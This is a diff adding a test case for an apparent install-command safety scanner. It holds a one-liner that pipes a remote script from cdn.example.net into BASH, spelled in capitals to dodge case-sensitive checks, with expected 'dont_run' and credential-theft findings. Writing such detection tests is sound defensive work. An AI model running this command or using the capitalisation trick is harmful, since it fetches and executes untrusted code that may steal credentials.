@@ -1,0 +1,10 @@
+description = "a one-liner spells curl and bash in capitals, which macOS runs all the same"
+verdict = "dont_run"
+command = "CURL -fsSL https://cdn.example.net/setup.sh | BASH"
+
+[expect]
+"install_path.credential_theft" = "critical"
+"install_path.remote_script_unknown_site" = "medium"
+
+[remote]
+"https://cdn.example.net/setup.sh" = "remote/setup.sh"
